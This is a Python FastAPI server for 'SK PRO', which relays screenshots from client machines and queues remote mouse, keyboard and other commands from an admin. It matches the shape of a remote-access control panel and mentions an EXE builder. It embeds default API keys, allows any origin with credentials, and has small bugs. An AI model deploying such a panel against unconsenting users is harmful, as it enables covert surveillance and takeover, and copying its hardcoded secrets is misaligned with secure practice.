"""
SK PRO - COMPLETE BACKEND SERVER
Real Remote View + Screenshot + Mouse Control + Heartbeat
"""

import os
import time
import sqlite3
import secrets
import base64
import io
from datetime import datetime
from typing import Optional
from contextlib import contextmanager

from fastapi import FastAPI, HTTPException, Header, Request, UploadFile, File
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

# ════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════

DB_PATH = os.getenv("DB_PATH", "skpro.db")
ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR")
USER_API_KEY = os.getenv("USER_API_KEY", "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV")
HEARTBEAT_TIMEOUT = 120  # 2 minutes

app = FastAPI(title="SK PRO Server", version="4.2")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ════════════════════════════════════════════════════════════════════
# DATABASE
# ════════════════════════════════════════════════════════════════════

def init_db():
    """Initialize database tables"""
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE,
                api_key TEXT,
                last_seen REAL,
                status TEXT,
                is_online BOOLEAN
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY,
                username TEXT,
                timestamp REAL,
                image_data BLOB,
                FOREIGN KEY(username) REFERENCES users(username)
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY,
                username TEXT,
                command TEXT,
                args TEXT,
                status TEXT,
                created_at REAL,
                FOREIGN KEY(username) REFERENCES users(username)
            )
        """)
        conn.commit()

init_db()

@contextmanager
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

# ════════════════════════════════════════════════════════════════════
# MODELS
# ════════════════════════════════════════════════════════════════════

class HeartbeatRequest(BaseModel):
    username: str
    timestamp: float
    status: str = "online"

class ScreenshotRequest(BaseModel):
    username: str
    image_base64: str
    timestamp: float

class CommandRequest(BaseModel):
    username: str
    command: str
    args: Optional[str] = None

class MouseCommand(BaseModel):
    x: int
    y: int
    action: str  # "move", "click", "drag"

class KeyboardCommand(BaseModel):
    key: str
    action: str  # "press", "hold", "release"

# ════════════════════════════════════════════════════════════════════
# AUTH
# ════════════════════════════════════════════════════════════════════

def verify_admin_key(x_api_key: str = Header(None)):
    """Verify admin API key"""
    if x_api_key != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid admin API key")
    return True

def verify_user_key(x_api_key: str = Header(None)):
    """Verify user API key"""
    if x_api_key != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid user API key")
    return True

# ════════════════════════════════════════════════════════════════════
# USER API ENDPOINTS (Client uses these)
# ════════════════════════════════════════════════════════════════════

@app.get("/api/user/test")
async def test_user_connection(auth=Header(None, alias="x-api-key")):
    """Test User API connection - for Build EXE / Client Receiver"""
    if auth != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    return {
        "ok": True,
        "role": "user",
        "status": "connected",
        "server": "SK PRO v4.2",
        "timestamp": time.time()
    }

@app.post("/api/user/heartbeat")
async def user_heartbeat(req: HeartbeatRequest, auth=Header(None, alias="x-api-key")):
    """Client sends heartbeat to stay online"""
    if auth != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        conn.execute("""
            INSERT OR REPLACE INTO users (username, api_key, last_seen, status, is_online)
            VALUES (?, ?, ?, ?, ?)
        """, (req.username, USER_API_KEY, req.timestamp, "online", True))
        conn.commit()
    
    return {"ok": True, "status": "heartbeat_received"}

@app.post("/api/user/screenshot")
async def user_upload_screenshot(req: ScreenshotRequest, auth=Header(None, alias="x-api-key")):
    """Client uploads screenshot"""
    if auth != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    try:
        image_data = base64.b64decode(req.image_base64)
        
        with get_db() as conn:
            conn.execute("""
                INSERT INTO screenshots (username, timestamp, image_data)
                VALUES (?, ?, ?)
            """, (req.username, req.timestamp, image_data))
            conn.commit()
        
        return {"ok": True, "screenshot_id": conn.lastrowid}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/user/commands")
async def get_user_commands(username: str, auth=Header(None, alias="x-api-key")):
    """Client checks for pending commands"""
    if auth != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        rows = conn.execute("""
            SELECT id, command, args FROM commands
            WHERE username = ? AND status = 'pending'
        """, (username,)).fetchall()
    
    return {
        "ok": True,
        "commands": [dict(row) for row in rows]
    }

@app.post("/api/user/command-ack")
async def ack_command(cmd_id: int, auth=Header(None, alias="x-api-key")):
    """Client confirms command execution"""
    if auth != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        conn.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (cmd_id,))
        conn.commit()
    
    return {"ok": True, "command_acknowledged": cmd_id}

# ════════════════════════════════════════════════════════════════════
# ADMIN API ENDPOINTS
# ════════════════════════════════════════════════════════════════════

@app.get("/api/admin/test")
@app.get("/api/admin/test")
async def test_admin_connection(auth=Header(None, alias="x-api-key")):
    """Test Admin API connection - for Live Monitor"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    return {
        "ok": True,
        "role": "admin",
        "status": "connected",
        "server": "SK PRO v4.2",
        "timestamp": time.time()
    }

@app.get("/api/admin/users")
async def get_all_users(auth=Header(None, alias="x-api-key")):
    """Admin gets all connected users"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        # Mark offline if heartbeat timeout
        timeout_threshold = time.time() - HEARTBEAT_TIMEOUT
        conn.execute("""
            UPDATE users SET is_online = 0, status = 'offline'
            WHERE last_seen < ? AND is_online = 1
        """, (timeout_threshold,))
        
        rows = conn.execute("""
            SELECT username, status, last_seen, is_online
            FROM users ORDER BY last_seen DESC
        """).fetchall()
        
        conn.commit()
    
    users = []
    for row in rows:
        users.append({
            "username": row[0],
            "status": row[1],
            "last_seen": row[2],
            "online": bool(row[3]),
            "session_duration": time.time() - row[2] if row[2] else 0
        })
    
    return {"ok": True, "users": users}

@app.get("/api/admin/screenshot/{username}")
async def get_latest_screenshot(username: str, auth=Header(None, alias="x-api-key")):
    """Admin gets latest screenshot from user"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        row = conn.execute("""
            SELECT image_data, timestamp FROM screenshots
            WHERE username = ? ORDER BY timestamp DESC LIMIT 1
        """, (username,)).fetchone()
    
    if not row:
        raise HTTPException(status_code=404, detail="No screenshot found")
    
    image_data, timestamp = row
    image_base64 = base64.b64encode(image_data).decode()
    
    return {
        "ok": True,
        "username": username,
        "image_base64": image_base64,
        "timestamp": timestamp
    }

@app.post("/api/admin/command")
async def send_command(req: CommandRequest, auth=Header(None, alias="x-api-key")):
    """Admin sends command to client"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        cursor = conn.execute("""
            INSERT INTO commands (username, command, args, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        """, (req.username, req.command, req.args, time.time()))
        conn.commit()
        cmd_id = cursor.lastrowid
    
    return {"ok": True, "command_id": cmd_id}

@app.post("/api/admin/mouse")
async def send_mouse_command(mouse_cmd: MouseCommand, username: str, auth=Header(None, alias="x-api-key")):
    """Admin sends mouse command to client"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    # Store as command in DB
    cmd_args = f"{mouse_cmd.x},{mouse_cmd.y},{mouse_cmd.action}"
    
    with get_db() as conn:
        cursor = conn.execute("""
            INSERT INTO commands (username, command, args, status, created_at)
            VALUES (?, 'mouse', ?, 'pending', ?)
        """, (username, cmd_args, time.time()))
        conn.commit()
        cmd_id = cursor.lastrowid
    
    return {"ok": True, "command_id": cmd_id, "type": "mouse"}

@app.post("/api/admin/keyboard")
async def send_keyboard_command(kbd_cmd: KeyboardCommand, username: str, auth=Header(None, alias="x-api-key")):
    """Admin sends keyboard command to client"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    # Store as command in DB
    cmd_args = f"{kbd_cmd.key},{kbd_cmd.action}"
    
    with get_db() as conn:
        cursor = conn.execute("""
            INSERT INTO commands (username, command, args, status, created_at)
            VALUES (?, 'keyboard', ?, 'pending', ?)
        """, (username, cmd_args, time.time()))
        conn.commit()
        cmd_id = cursor.lastrowid
    
    return {"ok": True, "command_id": cmd_id, "type": "keyboard"}

@app.get("/api/admin/status")
async def server_status(auth=Header(None, alias="x-api-key")):
    """Admin gets server status"""
    if auth != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    with get_db() as conn:
        online_count = conn.execute("SELECT COUNT(*) FROM users WHERE is_online = 1").fetchone()[0]
        total_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    
    return {
        "ok": True,
        "server": "SK PRO v4.2",
        "status": "running",
        "users_online": online_count,
        "users_total": total_count,
        "timestamp": time.time()
    }

# ════════════════════════════════════════════════════════════════════
# HEALTH CHECK
# ════════════════════════════════════════════════════════════════════

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "ok", "service": "SK PRO v4.2"}

# ════════════════════════════════════════════════════════════════════
# RUN SERVER
# ════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)

